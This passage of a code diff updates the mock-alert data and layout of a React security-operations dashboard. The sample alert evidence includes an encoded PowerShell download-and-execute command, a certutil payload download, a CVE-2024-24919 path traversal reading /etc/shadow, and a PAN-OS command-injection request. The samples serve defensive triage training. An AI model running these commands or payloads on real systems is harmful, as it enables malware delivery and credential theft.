@@ -1,647 +1,480 @@
-import { useState } from "react";
+import { useMemo, useState } from "react";
 import { cn } from "@/lib/utils";
 import {
-  Search, RotateCcw, ChevronDown, ChevronUp, Play, ThumbsUp, ThumbsDown, XCircle,
-  Shield, Star, AlertTriangle, Square,
+  Search, RefreshCw, Bell, User, X, ShieldAlert, FileText,
+  Ban, ThumbsDown, Clock, Cpu, Activity, ChevronRight,
 } from "lucide-react";
 import SOCSidebar from "@/components/soc/SOCSidebar";
 
 // ── Types ──────────────────────────────────────────────────────
+type Severity = "Critical" | "High" | "Medium" | "Low";
+type Status = "New" | "Investigating" | "Escalated" | "False Positive" | "Closed";
+
+interface TimelineEntry { time: string; analyst: string; action: string; }
+
 interface Alert {
   id: string;
-  title: string;
-  description: string;
-  severity: "Critical" | "High" | "Medium" | "Low";
-  logSource: string;
+  name: string;
   hostname: string;
-  username: string;
-  mitreTechnique: string;
+  severity: Severity;
+  status: Status;
   mitreId: string;
-  timestamp: string;
-  status: "Open" | "Investigating" | "Closed";
-  eventId: number;
-  alertType: string;
+  mitreName: string;
   sourceIp: string;
   destIp: string;
-  httpMethod: string;
-  url: string;
-  userAgent: string;
-  triggerReason: string;
-  relatedLogs: string[];
-  investigationHints: string[];
-  rawLog: string;
+  time: string;
+  user: string;
+  os: string;
+  edrStatus: "Active" | "Degraded" | "Offline";
+  evidence: string;
+  timeline: TimelineEntry[];
 }
 
-// ── Data ───────────────────────────────────────────────────────
+// ── Mock Data ──────────────────────────────────────────────────
 const alertsData: Alert[] = [
   {
-    id: "SOC-001",
-    title: "Suspicious PowerShell Execution with Encoded Command",
-    description: "A PowerShell process was spawned with a Base64-encoded command and execution policy bypass. Commonly associated with fileless malware and post-exploitation frameworks.",
-    severity: "Critical",
-    logSource: "Sysmon",
-    hostname: "WKS-PC-0127",
-    username: "jsmith",
-    mitreTechnique: "T1059.001 - Command and Scripting Interpreter: PowerShell",
-    mitreId: "T1059.001",
-    timestamp: "Jan 21, 2026, 02:32 PM",
-    status: "Open",
-    eventId: 4688,
-    alertType: "Web Attack",
-    sourceIp: "10.0.0.42",
-    destIp: "185.220.101.34",
-    httpMethod: "POST",
-    url: "/api/exec?cmd=encoded",
-    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    triggerReason: "Base64-encoded PowerShell command detected with execution policy bypass flag (-ep bypass -enc).",
-    relatedLogs: [
-      "Sysmon Event ID 1 — Process Creation: powershell.exe -ep bypass -enc aQBlAHgA...",
-      "Sysmon Event ID 3 — Network Connection: powershell.exe → 185.220.101.34:443",
-      "Windows Security Event 4688 — New Process Created: powershell.exe (Parent: winword.exe)",
+    id: "SOC-R-1042", name: "PowerShell Encoded Command Execution", hostname: "WKS-PC-0127",
+    severity: "Critical", status: "New", mitreId: "T1059.001", mitreName: "PowerShell",
+    sourceIp: "10.0.0.42", destIp: "185.220.101.34", time: "14:32:18", user: "CORP\\jsmith",
+    os: "Windows 11 Pro 23H2", edrStatus: "Active",
+    evidence: "powershell.exe -ep bypass -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgAzADQALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+    timeline: [
+      { time: "14:32:18", analyst: "system", action: "Alert triggered by Sysmon Event ID 1" },
+      { time: "14:33:02", analyst: "system", action: "Auto-enriched with VirusTotal (3/72 detections)" },
     ],
-    investigationHints: [
-      "Decode the Base64 string in the -enc parameter to reveal the actual PowerShell script.",
-      "Check the parent process — if it's winword.exe, this may indicate macro-based initial access.",
-      "Look for Sysmon Event ID 3 from powershell.exe to identify C2 communication.",
-      "Search for Event ID 4104 (Script Block Logging) for the full deobfuscated script.",
-    ],
-    rawLog: `{"EventID":1,"UtcTime":"2026-01-21 14:32:18.442","ProcessId":7284,"Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","CommandLine":"powershell.exe -ep bypass -enc aQBlAHgA...","ParentImage":"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE","User":"CORP\\\\jsmith"}`,
   },
   {
-    id: "SOC-002",
-    title: "LSASS Memory Access — Credential Dumping Detected",
-    description: "A non-standard process accessed LSASS memory. Technique used by Mimikatz to extract credentials.",
-    severity: "Critical",
-    logSource: "EDR",
-    hostname: "WKS-PC-0089",
-    username: "SYSTEM",
-    mitreTechnique: "T1003.001 - OS Credential Dumping: LSASS Memory",
-    mitreId: "T1003.001",
-    timestamp: "Jan 21, 2026, 01:55 PM",
-    status: "Investigating",
-    eventId: 4663,
-    alertType: "Data Leakage",
-    sourceIp: "172.16.0.89",
-    destIp: "172.16.0.1",
-    httpMethod: "N/A",
-    url: "N/A",
-    userAgent: "N/A",
-    triggerReason: "notepad.exe accessed lsass.exe memory with GrantedAccess 0x1010 — Mimikatz signature match.",
-    relatedLogs: [
-      "Sysmon Event ID 10 — Process Accessed: notepad.exe → lsass.exe (GrantedAccess: 0x1010)",
-      "EDR Alert: Suspicious LSASS access from PID 5544 (notepad.exe)",
-      "Windows Security Event 4663 — Object Access: lsass.exe memory read",
+    id: "SOC-R-2018", name: "LSASS Memory Access — Credential Dumping", hostname: "WKS-PC-0089",
+    severity: "Critical", status: "Investigating", mitreId: "T1003.001", mitreName: "LSASS Memory",
+    sourceIp: "172.16.0.89", destIp: "172.16.0.1", time: "13:55:32", user: "NT AUTHORITY\\SYSTEM",
+    os: "Windows 10 Enterprise", edrStatus: "Active",
+    evidence: "Source: notepad.exe (PID 5544)\nTarget: lsass.exe (PID 712)\nGrantedAccess: 0x1010\nCallTrace: ntdll.dll+0x9c534 -> KERNELBASE.dll+0x2a3b1",
+    timeline: [
+      { time: "13:55:32", analyst: "system", action: "EDR flagged Mimikatz signature match" },
+      { time: "13:58:11", analyst: "a.chen", action: "Acknowledged alert, opened investigation" },
+      { time: "14:02:47", analyst: "a.chen", action: "Host quarantined via EDR console" },
     ],
-    investigationHints: [
-      "notepad.exe accessing LSASS is highly abnormal — likely process injection or renamed binary.",
-      "Check the hash of 'notepad.exe' binary — is it legitimate or a renamed tool?",
-      "Look for Sysmon Event ID 8 (CreateRemoteThread) for process injection evidence.",
-      "Check if any credentials were used for lateral movement after this event.",
-    ],
-    rawLog: `{"EventID":10,"UtcTime":"2026-01-21 13:55:32.998","SourceProcessId":5544,"SourceImage":"C:\\\\Windows\\\\System32\\\\notepad.exe","TargetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","GrantedAccess":"0x1010"}`,
   },
   {
-    id: "SOC-003",
-    title: "Impersonating Domain MX Record Change Detected",
-    description: "DNS MX record for a monitored domain was changed to an unauthorized mail server, potentially enabling email interception.",
-    severity: "Medium",
-    logSource: "Firewall",
-    hostname: "DNS-SRV-01",
-    username: "dns_admin",
-    mitreTechnique: "T1071.004 - Application Layer Protocol: DNS",
-    mitreId: "T1071.004",
-    timestamp: "Jan 20, 2026, 09:44 AM",
-    status: "Open",
-    eventId: 326,
-    alertType: "ThreatIntel",
-    sourceIp: "203.0.113.50",
-    destIp: "10.0.0.53",
-    httpMethod: "DNS",
-    url: "MX corp.local → mail.suspicious-domain.xyz",
-    userAgent: "N/A",
-    triggerReason: "MX record for corp.local was changed to point to an external unauthorized mail server.",
-    relatedLogs: [
-      "DNS Audit Log: MX record change for corp.local → mail.suspicious-domain.xyz",
-      "Firewall Log: 203.0.113.50 → 10.0.0.53:53 DNS UPDATE request",
+    id: "SOC-R-3301", name: "CVE-2024-24919 Checkpoint Arbitrary File Read", hostname: "FW-GW-01",
+    severity: "High", status: "Escalated", mitreId: "T1190", mitreName: "Exploit Public App",
+    sourceIp: "45.33.32.156", destIp: "10.0.0.1", time: "11:22:04", user: "—",
+    os: "Gaia R81.20", edrStatus: "Active",
+    evidence: "POST /clients/MyCRL HTTP/1.1\nHost: vpn.corp.local\nUser-Agent: python-requests/2.28.1\nContent-Length: 39\n\naCSHELL/../../../../../../etc/shadow",
+    timeline: [
+      { time: "11:22:04", analyst: "system", action: "WAF detected path traversal pattern" },
+      { time: "11:25:00", analyst: "m.rivera", action: "Confirmed exploit attempt, IP blocked at perimeter" },
+      { time: "11:40:18", analyst: "m.rivera", action: "Escalated to IR team — Tier 2" },
     ],
-    investigationHints: [
-      "Verify if the MX record change was authorized through change management.",
-      "Check if mail.suspicious-domain.xyz appears in threat intelligence feeds.",
-      "Review DNS admin account activity for signs of compromise.",
-    ],
-    rawLog: `{"EventID":326,"TimeCreated":"2026-01-20T09:44:00Z","RecordType":"MX","OldValue":"mail.corp.local","NewValue":"mail.suspicious-domain.xyz","Source":"203.0.113.50"}`,
   },
   {
-    id: "SOC-004",
-    title: "Arbitrary File Read on Checkpoint Security Gateway [CVE-2024-24919]",
-    description: "Exploitation attempt targeting CVE-2024-24919 vulnerability allowing arbitrary file read on Checkpoint Security Gateway appliance.",
-    severity: "High",
-    logSource: "Firewall",
-    hostname: "FW-GW-01",
-    username: "N/A",
-    mitreTechnique: "T1190 - Exploit Public-Facing Application",
-    mitreId: "T1190",
-    timestamp: "Jun 06, 2024, 11:22 AM",
-    status: "Investigating",
-    eventId: 316,
-    alertType: "Web Attack",
-    sourceIp: "45.33.32.156",
-    destIp: "10.0.0.1",
-    httpMethod: "POST",
-    url: "/clients/MyCRL",
-    userAgent: "python-requests/2.28.1",
-    triggerReason: "HTTP POST request to /clients/MyCRL with path traversal payload targeting CVE-2024-24919.",
-    relatedLogs: [
-      "WAF Log: POST /clients/MyCRL — Path traversal detected",
-      "Firewall IPS: CVE-2024-24919 exploit attempt from 45.33.32.156",
-      "Access Log: 45.33.32.156 — User-Agent: python-requests/2.28.1",
+    id: "SOC-R-1156", name: "RDP Brute Force from External IP", hostname: "DC-01",
+    severity: "High", status: "Investigating", mitreId: "T1110.001", mitreName: "Password Guessing",
+    sourceIp: "192.168.1.105", destIp: "10.0.0.10", time: "14:15:00", user: "admin_svc",
+    os: "Windows Server 2022", edrStatus: "Active",
+    evidence: "EventID: 4625 (x15)\nLogonType: 10 (RemoteInteractive)\nFailureReason: Unknown user or bad password\nIpAddress: 192.168.1.105\nTimeWindow: 14:12:00 - 14:15:00",
+    timeline: [
+      { time: "14:15:00", analyst: "system", action: "Threshold exceeded: 15 failures in 3 minutes" },
+      { time: "14:16:42", analyst: "k.patel", action: "Source IP added to watchlist" },
     ],
-    investigationHints: [
-      "Check if the exploit was successful — look for response codes 200 with file content.",
-      "Verify Checkpoint gateway is patched against CVE-2024-24919.",
-      "Block source IP 45.33.32.156 at the perimeter firewall.",
-      "Review other requests from the same source IP for additional exploitation attempts.",
-    ],
-    rawLog: `{"timestamp":"2024-06-06T11:22:00Z","src_ip":"45.33.32.156","dst_ip":"10.0.0.1","method":"POST","url":"/clients/MyCRL","status":200,"user_agent":"python-requests/2.28.1","payload":"aCSHELL/../../../etc/shadow"}`,
   },
   {
-    id: "SOC-005",
-    title: "Application Token Steal Attempt Detected",
-    description: "An attempt to steal application authentication tokens was detected via crafted API request.",
-    severity: "Medium",
-    logSource: "EDR",
-    hostname: "APP-SRV-02",
-    username: "webapp_svc",
-    mitreTechnique: "T1528 - Steal Application Access Token",
-    mitreId: "T1528",
-    timestamp: "Jan 19, 2026, 03:15 PM",
-    status: "Open",
-    eventId: 325,
-    alertType: "Web Attack",
-    sourceIp: "192.168.1.200",
-    destIp: "10.0.0.80",
-    httpMethod: "GET",
-    url: "/api/v2/auth/tokens?include=refresh",
-    userAgent: "curl/7.88.1",
-    triggerReason: "Unauthorized API call attempting to enumerate and extract OAuth refresh tokens.",
-    relatedLogs: [
-      "API Gateway Log: GET /api/v2/auth/tokens — 403 Forbidden",
-      "EDR: Suspicious curl execution targeting internal API endpoint",
+    id: "SOC-R-4477", name: "Suspicious MX Record Change Detected", hostname: "DNS-SRV-01",
+    severity: "Medium", status: "New", mitreId: "T1071.004", mitreName: "DNS",
+    sourceIp: "203.0.113.50", destIp: "10.0.0.53", time: "09:44:12", user: "dns_admin",
+    os: "Ubuntu 22.04 LTS", edrStatus: "Active",
+    evidence: "RecordType: MX\nOldValue: mail.corp.local\nNewValue: mail.suspicious-domain.xyz\nSource: 203.0.113.50\nTTL: 300",
+    timeline: [
+      { time: "09:44:12", analyst: "system", action: "DNS audit log change detected" },
     ],
-    investigationHints: [
-      "Check if the request came from an internal compromised host or an attacker.",
-      "Review API access logs for webapp_svc account for other anomalous requests.",
-      "Verify OAuth token rotation policies are in place.",
-    ],
-    rawLog: `{"timestamp":"2026-01-19T15:15:00Z","src_ip":"192.168.1.200","method":"GET","url":"/api/v2/auth/tokens?include=refresh","status":403,"user":"webapp_svc"}`,
   },
   {
-    id: "SOC-006",
-    title: "Palo Alto Networks PAN-OS Command Injection Exploitation",
-    description: "Command injection vulnerability exploitation attempt detected on Palo Alto Networks PAN-OS device.",
-    severity: "Critical",
-    logSource: "Firewall",
-    hostname: "PA-FW-01",
-    username: "N/A",
-    mitreTechnique: "T1190 - Exploit Public-Facing Application",
-    mitreId: "T1190",
-    timestamp: "Jan 18, 2026, 08:12 AM",
-    status: "Open",
-    eventId: 274,
-    alertType: "Proxy",
-    sourceIp: "91.215.85.17",
-    destIp: "10.0.0.254",
-    httpMethod: "POST",
-    url: "/php/utils/router.php",
-    userAgent: "Mozilla/5.0",
-    triggerReason: "Command injection payload detected in POST body targeting PAN-OS management interface.",
-    relatedLogs: [
-      "IPS Alert: PAN-OS Command Injection from 91.215.85.17",
-      "Firewall Log: POST /php/utils/router.php — Malicious payload in body",
-      "Syslog: PA-FW-01 — Threat detected, action: alert",
+    id: "SOC-R-2204", name: "OAuth Token Enumeration Attempt", hostname: "APP-SRV-02",
+    severity: "Medium", status: "Investigating", mitreId: "T1528", mitreName: "Steal App Token",
+    sourceIp: "192.168.1.200", destIp: "10.0.0.80", time: "15:15:33", user: "webapp_svc",
+    os: "RHEL 9.2", edrStatus: "Active",
+    evidence: "GET /api/v2/auth/tokens?include=refresh HTTP/1.1\nHost: api.corp.local\nAuthorization: Bearer <redacted>\nResponse: 403 Forbidden",
+    timeline: [
+      { time: "15:15:33", analyst: "system", action: "API gateway flagged anomalous endpoint access" },
+      { time: "15:18:00", analyst: "a.chen", action: "Reviewing service account scope" },
     ],
-    investigationHints: [
-      "Verify PAN-OS firmware version and patch level.",
-      "Check if the management interface is exposed to the internet (it shouldn't be).",
-      "Block source IP 91.215.85.17 and check for successful exploitation.",
-      "Review firewall configuration changes in the last 24 hours.",
-    ],
-    rawLog: `{"timestamp":"2026-01-18T08:12:00Z","src_ip":"91.215.85.17","dst_ip":"10.0.0.254","method":"POST","url":"/php/utils/router.php","threat_type":"command-injection","action":"alert"}`,
   },
   {
-    id: "SOC-007",
-    title: "Suspicious PowerShell Script Executed",
-    description: "PowerShell script execution detected with obfuscated commands and network activity.",
-    severity: "Medium",
-    logSource: "Sysmon",
-    hostname: "WKS-PC-0042",
-    username: "mwilliams",
-    mitreTechnique: "T1059.001 - Command and Scripting Interpreter: PowerShell",
-    mitreId: "T1059.001",
-    timestamp: "Jan 17, 2026, 04:30 PM",
-    status: "Closed",
-    eventId: 163,
-    alertType: "Web Attack",
-    sourceIp: "10.0.0.42",
-    destIp: "104.21.56.78",
-    httpMethod: "GET",
-    url: "hxxps://cdn-update[.]com/payload.ps1",
-    userAgent: "PowerShell/7.3",
-    triggerReason: "PowerShell downloaded and executed script from external suspicious domain.",
-    relatedLogs: [
-      "Sysmon Event ID 1 — powershell.exe -NoProfile -ExecutionPolicy Bypass -File payload.ps1",
-      "Sysmon Event ID 3 — Network Connection: powershell.exe → 104.21.56.78:443",
+    id: "SOC-R-3309", name: "PAN-OS Command Injection Attempt", hostname: "PA-FW-01",
+    severity: "Critical", status: "New", mitreId: "T1190", mitreName: "Exploit Public App",
+    sourceIp: "91.215.85.17", destIp: "10.0.0.254", time: "08:12:55", user: "—",
+    os: "PAN-OS 11.0", edrStatus: "Active",
+    evidence: "POST /php/utils/router.php HTTP/1.1\nHost: mgmt.corp.local\nContent-Type: application/x-www-form-urlencoded\n\ncmd=%60id%60",
+    timeline: [
+      { time: "08:12:55", analyst: "system", action: "IPS signature CVE-2024-3400 matched" },
     ],
-    investigationHints: [
-      "Retrieve and analyze the downloaded payload.ps1 script.",
-      "Check if the domain cdn-update.com is flagged in threat intel.",
-      "Review what the script did after execution — file drops, registry changes, etc.",
-    ],
-    rawLog: `{"EventID":1,"UtcTime":"2026-01-17 16:30:00","Image":"powershell.exe","CommandLine":"powershell.exe -NoProfile -ExecutionPolicy Bypass -File payload.ps1","User":"CORP\\\\mwilliams"}`,
   },
   {
-    id: "SOC-008",
-    title: "RDP Brute Force Detected",
-    description: "Multiple failed RDP login attempts detected from external IP targeting domain controller.",
-    severity: "Medium",
-    logSource: "Windows Event Logs",
-    hostname: "DC-01",
-    username: "admin_svc",
-    mitreTechnique: "T1110.001 - Brute Force: Password Guessing",
-    mitreId: "T1110.001",
-    timestamp: "Jan 17, 2026, 02:15 PM",
-    status: "Investigating",
-    eventId: 176,
-    alertType: "Brute Force",
-    sourceIp: "192.168.1.105",
-    destIp: "10.0.0.10",
-    httpMethod: "RDP",
-    url: "N/A",
-    userAgent: "N/A",
-    triggerReason: "15 failed RDP login attempts within 3 minutes from single source IP.",
-    relatedLogs: [
-      "Windows Event 4625 (x15) — Failed Logon Type 10 from 192.168.1.105",
-      "Windows Event 4776 — NTLM auth failure for admin_svc",
+    id: "SOC-R-5012", name: "Macro-Enabled Document Spawned Shell", hostname: "WKS-PC-0156",
+    severity: "Medium", status: "Investigating", mitreId: "T1204.002", mitreName: "Malicious File",
+    sourceIp: "10.0.0.156", destIp: "91.215.85.17", time: "11:42:17", user: "CORP\\mgarcia",
+    os: "Windows 11 Pro", edrStatus: "Active",
+    evidence: "ParentImage: WINWORD.EXE\nImage: cmd.exe\nCommandLine: cmd.exe /c certutil -urlcache -split -f http://91.215.85.17/payload.exe\nFile: Invoice-Q4-2025.docm",
+    timeline: [
+      { time: "11:42:17", analyst: "system", action: "Suspicious parent-child process chain detected" },
+      { time: "11:50:30", analyst: "k.patel", action: "Email source identified, quarantined" },
     ],
-    investigationHints: [
-      "Check if source IP 192.168.1.105 is internal or compromised.",
-      "Look for Event ID 4624 after the failures — indicates successful brute force.",
-      "Review if the RDP port is exposed externally.",
-    ],
-    rawLog: `{"EventID":4625,"TimeCreated":"2026-01-17T14:15:00Z","Computer":"DC-01","TargetUserName":"admin_svc","LogonType":10,"IpAddress":"192.168.1.105","FailureCount":15}`,
   },
   {
-    id: "SOC-009",
-    title: "Malicious Macro Has Been Executed",
-    description: "Macro-enabled document executed a command shell, indicating potential malware delivery.",
-    severity: "Medium",
-    logSource: "Sysmon",
-    hostname: "WKS-PC-0156",
-    username: "mgarcia",
-    mitreTechnique: "T1204.002 - User Execution: Malicious File",
-    mitreId: "T1204.002",
-    timestamp: "Jan 16, 2026, 11:42 AM",
-    status: "Open",
-    eventId: 205,
-    alertType: "Malware",
-    sourceIp: "10.0.0.156",
-    destIp: "91.215.85.17",
-    httpMethod: "GET",
-    url: "hxxp://91.215.85.17/payload.exe",
-    userAgent: "certutil/10.0",
-    triggerReason: "WINWORD.EXE spawned cmd.exe which used certutil to download external payload.",
-    relatedLogs: [
-      "Sysmon Event ID 1 — cmd.exe (Parent: WINWORD.EXE)",
-      "Sysmon Event ID 1 — certutil -urlcache -split -f http://91.215.85.17/payload.exe",
-      "Sysmon Event ID 15 — Invoice-Q4-2025.docm:Zone.Identifier",
+    id: "SOC-R-6601", name: "Anomalous Outbound Traffic to TOR Exit Node", hostname: "WKS-PC-0204",
+    severity: "Low", status: "False Positive", mitreId: "T1090.003", mitreName: "Multi-hop Proxy",
+    sourceIp: "10.0.0.204", destIp: "176.10.99.200", time: "10:08:44", user: "CORP\\rsingh",
+    os: "Windows 11 Pro", edrStatus: "Active",
+    evidence: "Connection: 10.0.0.204:51234 -> 176.10.99.200:9001\nProcess: torbrowser.exe\nBytesSent: 12.4 KB\nDuration: 8s",
+    timeline: [
+      { time: "10:08:44", analyst: "system", action: "Destination matched TOR exit node list" },
+      { time: "10:30:11", analyst: "m.rivera", action: "User confirmed personal research, marked FP" },
     ],
-    investigationHints: [
-      "The .docm file was likely delivered via phishing — check email gateway logs.",
-      "certutil for downloading is a known LOLBin technique (T1105).",
-      "Check if payload.exe was successfully downloaded and executed.",
+  },
+  {
+    id: "SOC-R-7720", name: "Service Account Login from Unusual Geo", hostname: "AUTH-SRV-01",
+    severity: "Low", status: "Closed", mitreId: "T1078.003", mitreName: "Local Accounts",
+    sourceIp: "203.0.113.99", destIp: "10.0.0.20", time: "07:01:09", user: "svc_backup",
+    os: "Windows Server 2019", edrStatus: "Active",
+    evidence: "EventID: 4624\nLogonType: 3 (Network)\nGeoIP: Singapore (expected: US-East)\nResult: Success",
+    timeline: [
+      { time: "07:01:09", analyst: "system", action: "GeoIP anomaly detected" },
+      { time: "08:15:00", analyst: "a.chen", action: "Verified scheduled backup window, closed" },
     ],
-    rawLog: `{"EventID":1,"UtcTime":"2026-01-16 11:42:17","Image":"cmd.exe","CommandLine":"cmd.exe /c certutil -urlcache -split -f http://91.215.85.17/payload.exe","ParentImage":"WINWORD.EXE","User":"CORP\\\\mgarcia"}`,
   },
 ];
 
-const logSources = ["All Sources", "Windows Event Logs", "Sysmon", "Firewall", "EDR"];
-const alertTypes = ["All Types", "Web Attack", "Data Leakage", "ThreatIntel", "Brute Force", "Malware", "Proxy"];
-
-const sevConfig: Record<string, { icon: React.ReactNode; textClass: string; dotClass: string }> = {
-  Critical: { icon: <Star className="w-3.5 h-3.5 fill-current" />, textClass: "text-red-400", dotClass: "text-red-500" },
-  High: { icon: <AlertTriangle className="w-3.5 h-3.5" />, textClass: "text-orange-400", dotClass: "text-orange-500" },
-  Medium: { icon: <Square className="w-3.5 h-3.5 fill-current" />, textClass: "text-yellow-400", dotClass: "text-yellow-500" },
-  Low: { icon: <Square className="w-3.5 h-3.5 fill-current" />, textClass: "text-blue-400", dotClass: "text-blue-500" },
+// ── Styling Maps ──────────────────────────────────────────────
+const sevBadge: Record<Severity, string> = {
+  Critical: "bg-red-500/15 text-red-400 border-red-500/30",
+  High:     "bg-yellow-500/15 text-yellow-400 border-yellow-500/30",
+  Medium:   "bg-orange-500/15 text-orange-400 border-orange-500/30",
+  Low:      "bg-green-500/15 text-green-400 border-green-500/30",
 };
 
-const statusColors: Record<string, string> = {
-  Open: "text-red-400",
-  Investigating: "text-yellow-400",
-  Closed: "text-neutral-500",
+const sevBorder: Record<Severity, string> = {
+  Critical: "border-l-red-500",
+  High:     "border-l-yellow-500",
+  Medium:   "border-l-orange-500",
+  Low:      "border-l-green-500",
+};
+
+const statusBadge: Record<Status, string> = {
+  "New":            "bg-blue-500/15 text-blue-400 border-blue-500/30",
+  "Investigating":  "bg-purple-500/15 text-purple-400 border-purple-500/30",
+  "Escalated":      "bg-pink-500/15 text-pink-400 border-pink-500/30",
+  "False Positive": "bg-zinc-500/15 text-zinc-400 border-zinc-500/30",
+  "Closed":         "bg-emerald-500/15 text-emerald-400 border-emerald-500/30",
 };
 
 // ── Component ──────────────────────────────────────────────────
 const Alerts = () => {
-  const [selectedSeverity, setSelectedSeverity] = useState("all");
-  const [selectedStatus, setSelectedStatus] = useState("all");
-  const [selectedSource, setSelectedSource] = useState("All Sources");
-  const [selectedType, setSelectedType] = useState("All Types");
-  const [searchQuery, setSearchQuery] = useState("");
-  const [expandedId, setExpandedId] = useState<string | null>(null);
+  const [selected, setSelected] = useState<Alert | null>(alertsData[0]);
+  const [checked, setChecked] = useState<Set<string>>(new Set());
+  const [search, setSearch] = useState("");
+  const [sevFilter, setSevFilter] = useState<"All" | Severity>("All");
 
-  const filteredAlerts = alertsData.filter((a) => {
-    if (selectedSeverity !== "all" && a.severity !== selectedSeverity) return false;
-    if (selectedStatus !== "all" && a.status !== selectedStatus) return false;
-    if (selectedSource !== "All Sources" && a.logSource !== selectedSource) return false;
-    if (selectedType !== "All Types" && a.alertType !== selectedType) return false;
-    if (searchQuery) {
-      const q = searchQuery.toLowerCase();
-      if (![a.title, a.id, a.hostname, a.username, a.mitreId, a.alertType].some((f) => f.toLowerCase().includes(q))) return false;
-    }
-    return true;
-  });
+  const filtered = useMemo(() => {
+    return alertsData.filter(a => {
+      if (sevFilter !== "All" && a.severity !== sevFilter) return false;
+      if (search) {
+        const q = search.toLowerCase();
+        if (![a.id, a.name, a.hostname, a.mitreId, a.sourceIp].some(f => f.toLowerCase().includes(q))) return false;
+      }
+      return true;
+    });
+  }, [search, sevFilter]);
 
-  const openCount = alertsData.filter((a) => a.status === "Open").length;
+  const stats = useMemo(() => ({
+    total: alertsData.length,
+    critical: alertsData.filter(a => a.severity === "Critical").length,
+    high: alertsData.filter(a => a.severity === "High").length,
+    medium: alertsData.filter(a => a.severity === "Medium").length,
+    low: alertsData.filter(a => a.severity === "Low").length,
+  }), []);
 
-  const resetFilters = () => {
-    setSelectedSeverity("all");
-    setSelectedStatus("all");
-    setSelectedSource("All Sources");
-    setSelectedType("All Types");
-    setSearchQuery("");
+  const toggleCheck = (id: string) => {
+    setChecked(prev => {
+      const n = new Set(prev);
+      if (n.has(id)) n.delete(id); else n.add(id);
+      return n;
+    });
   };
 
   return (
-    <div className="min-h-screen bg-[#0b1220] text-neutral-300 flex">
-      {/* ─── SOC Sidebar ─── */}
+    <div className="min-h-screen bg-[#0d1117] text-zinc-300 flex font-sans">
       <SOCSidebar activeItem="Alerts" />
 
-      {/* ─── Main Content ─── */}
-      <div className="flex-1 flex flex-col overflow-hidden">
-
-      {/* ─── Page Header ─── */}
-      <div className="px-6 pt-6 pb-4">
-        <div className="flex items-center gap-4">
-          <h1 className="text-2xl font-bold text-white tracking-tight">Alerts</h1>
-          <div className="flex items-center gap-2">
-            <span className="relative flex h-2.5 w-2.5">
-              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-40" />
-              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-primary" />
-            </span>
-            <span className="text-sm text-neutral-400">{openCount} alerts incoming</span>
-          </div>
-        </div>
-      </div>
-
-      {/* ─── Filter Bar ─── */}
-      <div className="px-6 pb-4 flex flex-wrap items-center gap-3">
-        {/* Search */}
-        <div className="relative min-w-[240px]">
-          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-neutral-600" />
-          <input
-            type="text"
-            placeholder="Search for an alert"
-            value={searchQuery}
-            onChange={(e) => setSearchQuery(e.target.value)}
-            className="w-full bg-[#0f1a2e] border border-[#1a2540] rounded-lg px-4 pl-10 py-2 text-sm text-neutral-300 placeholder:text-neutral-600 focus:outline-none focus:border-[#2a3f6a] transition-colors"
-          />
-        </div>
-
-        {/* Reset */}
-        <button
-          onClick={resetFilters}
-          className="flex items-center gap-2 px-4 py-2 text-sm text-neutral-400 bg-[#0f1a2e] border border-[#1a2540] rounded-lg hover:text-neutral-200 hover:border-[#2a3f6a] transition-colors"
-        >
-          <RotateCcw className="w-3.5 h-3.5" />
-          Reset filters
-        </button>
-
-        {/* Severity */}
-        <select
-          value={selectedSeverity}
-          onChange={(e) => setSelectedSeverity(e.target.value)}
-          className="bg-[#0f1a2e] border border-[#1a2540] rounded-lg px-3 py-2 text-sm text-neutral-400 focus:outline-none focus:border-[#2a3f6a] cursor-pointer"
-        >
-          <option value="all">Severity</option>
-          <option value="Critical">Critical</option>
-          <option value="High">High</option>
-          <option value="Medium">Medium</option>
-          <option value="Low">Low</option>
-        </select>
-
-        {/* Status */}
-        <select
-          value={selectedStatus}
-          onChange={(e) => setSelectedStatus(e.target.value)}
-          className="bg-[#0f1a2e] border border-[#1a2540] rounded-lg px-3 py-2 text-sm text-neutral-400 focus:outline-none focus:border-[#2a3f6a] cursor-pointer"
-        >
-          <option value="all">Status</option>
-          <option value="Open">Open</option>
-          <option value="Investigating">Investigating</option>
-          <option value="Closed">Closed</option>
-        </select>
-
-        {/* Alert Type */}
-        <select
-          value={selectedType}
-          onChange={(e) => setSelectedType(e.target.value)}
-          className="bg-[#0f1a2e] border border-[#1a2540] rounded-lg px-3 py-2 text-sm text-neutral-400 focus:outline-none focus:border-[#2a3f6a] cursor-pointer"
-        >
-          {alertTypes.map((t) => (
-            <option key={t} value={t}>{t === "All Types" ? "Alert type" : t}</option>
-          ))}
-        </select>
-
-        {/* Results count */}
-        <span className="ml-auto text-xs text-neutral-600">
-          Show <span className="text-neutral-400 font-medium">{filteredAlerts.length}</span> alerts
-        </span>
-      </div>
-
-      {/* ─── Alerts Table ─── */}
-      <div className="flex-1 px-6 pb-6 overflow-auto">
-        <div className="bg-[#0d1526] border border-[#1a2540] rounded-lg overflow-hidden">
-          {/* Table Header */}
-          <div className="grid grid-cols-[40px_100px_1fr_100px_100px_60px] md:grid-cols-[40px_100px_1fr_100px_100px_120px] border-b border-[#1a2540]">
-            <div className="px-3 py-3 text-[11px] font-semibold text-neutral-500 uppercase tracking-wider">ID</div>
-            <div className="px-3 py-3 text-[11px] font-semibold text-neutral-500 uppercase tracking-wider">Severity</div>
-            <div className="px-3 py-3 text-[11px] font-semibold text-neutral-500 uppercase tracking-wider">Date</div>
-            <div className="px-3 py-3 text-[11px] font-semibold text-neutral-500 uppercase tracking-wider hidden md:block">EventID</div>
-            <div className="px-3 py-3 text-[11px] font-semibold text-neutral-500 uppercase tracking-wider">Type</div>
-            <div className="px-3 py-3 text-[11px] font-semibold text-neutral-500 uppercase tracking-wider">Action</div>
